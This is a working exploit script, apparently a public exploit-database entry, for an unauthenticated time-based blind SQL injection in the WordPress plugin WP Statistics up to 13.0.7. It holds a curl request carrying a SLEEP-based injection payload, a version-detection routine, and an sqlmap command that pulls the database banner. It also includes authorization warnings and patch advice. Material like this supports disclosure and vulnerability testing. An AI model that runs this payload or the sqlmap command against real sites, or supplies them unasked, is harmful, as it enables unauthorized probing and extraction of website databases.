# Exploit Title: WordPress Plugin WP Statistics 13.0.7 - Time-Based Blind SQL Injection (Unauthenticated)
# Date: 20/05/2021
# Exploit Author: Mansoor R (@time4ster)
# CVSS Score: 7.5 (High)
# CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
# Version Affected: 13.0 to 13.0.7
# Vendor URL: https://wordpress.org/plugins/wp-statistics/
# Patch: Upgrade to wp-statistics 13.0.8 (or above)
# Tested On: wp-statistics 13.0.6,13.0.7

#!/bin/bash

# Credits:
# https://www.wordfence.com/blog/2021/05/over-600000-sites-impacted-by-wp-statistics-patch/

# SQLmap Exploit for grepping database banner (automated):
# sqlmap -u "http://192.168.1.54/wordpress/wp-admin/admin.php?ID=1&page=wps_pages_page&type=1" --techniqu=T --dbms="mysql" -p "ID" -b

# WARNINGS:
# Only test the exploit on websites you are authorized to.
# The exploit will perform sleep for 3 seconds. Don't use on production server of organization without prior permissions.


# Exploit
# ==============

echo
echo "============================================================================================"
echo "Unauthenticated Time-Based Blind SQL Injection in WP Statistics < 13.0.8"
echo
echo "By: Mansoor R (@time4ster)"
echo "============================================================================================"
echo



function printHelp()
{
	echo -e "
Usage:

-u|--wp-url      <string>		Wordpress target url
-k|--check				Only checks whether vulnerable version of plugin is running or not.
-h|--help				Print Help menu


Example:
./wp-statistics-exploit.sh --wp_url https://www.example.com/wordpress
./wp-statistics-exploit.sh --wp_url https://www.example.com/wordpress --check
"
}

#Processing arguments
check="false"
exploit="true"
while [[ "$#" -gt 0 ]]
do
key="$1"

case "$key" in
    -u|--wp-url)
	    wp_url="$2"
	    shift
	    shift # past argument
	    ;;
    -k|--check)
	    check="true"
	    exploit="false"
	    shift
	    shift
	    ;;
    -h|--help)
	    printHelp
	    exit
	    shift
	    ;;
    *)
	    echo [-] Enter valid options
	    exit
	    ;;
esac
done

[[ -z "$wp_url" ]] && echo "[-] Supply wordpress target URL. Use -h for help menu." && exit

function checkVersion()
{
	url="$1"
	[[ -z "$url" ]] && return
	target_endpoint="$url/wp-content/plugins/wp-statistics/readme.txt"
	user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36"

	version=$(curl -ks --max-time 5 --user-agent "$user_agent" "$target_endpoint" | grep -i -m 1 "stable tag:" | grep -o -E "[0-9]+\.[0-9]+\.[0-9]+")
	[[ -n "$version" ]] && echo "[+] WP-statistical Plugin Version: $version"
	[[ -z "$version" ]] && echo "[-] WP-statistical Unable to detect version." && return

	vuln_version=(13.0.7 13.0.6 13.0.5 13.0.4 13.0.3 13.0.1 13.0)
	is_vulnerable="false"
	for v in "${vuln_version[@]}";do
		[[ "$version" == "$v" ]] && is_vulnerable="true" && break
	done
	[[ "$is_vulnerable" == "true" ]] && echo "[++] Target $url is Vulnerable"
	[[ "$is_vulnerable" == "false" ]] && echo "[--] Target $url is  Not Vulnerable"
}

function exploitPlugin()
{
	url="$1"
	target_endpoint="$url/wp-admin/admin.php"
	user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36"
	sleep=3
	payload="ID=1 AND (SELECT * from (select SLEEP($sleep))a)"

	echo -e -n "[!] Caution: You are going to execute sleep database command for $sleep seconds. Proceed only if you have permission.\nPress (Y/y) to continue or any other key to exit: "
	read choice
	[[ "$choice" != "y" ]] && [[ "$choice" != "Y" ]] && return

	echo
	echo "[+] Trying Payload:"
	set -x
	curl -v -ks -G --user-agent "$user_agent" "$target_endpoint" \
		--data-urlencode "page=wps_pages_page" \
		--data-urlencode "type=1" \
		--data-urlencode "$payload"


}

[[ "$check" == "true" ]] && checkVersion "$wp_url"
[[ "$exploit" == "true" ]] && exploitPlugin "$wp_url"